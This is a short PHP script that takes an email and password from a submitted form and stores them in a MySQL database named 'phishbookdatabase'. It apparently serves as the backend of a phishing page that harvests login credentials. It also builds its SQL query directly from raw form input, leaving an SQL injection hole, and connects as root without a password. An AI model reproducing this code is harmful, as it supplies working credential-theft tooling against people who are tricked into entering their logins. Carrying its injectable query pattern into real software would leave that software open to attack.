<?php
$connection = mysqli_connect('localhost','root');

mysqli_select_db($connection,"phishbookdatabase");

$email =$_POST['email'];
$password =$_POST['password'];

$query = "INSERT INTO `log-in`(`email`,`password`) VALUES ('$email','$password')" ;

mysqli_query($connection, $query);
echo"success";
?>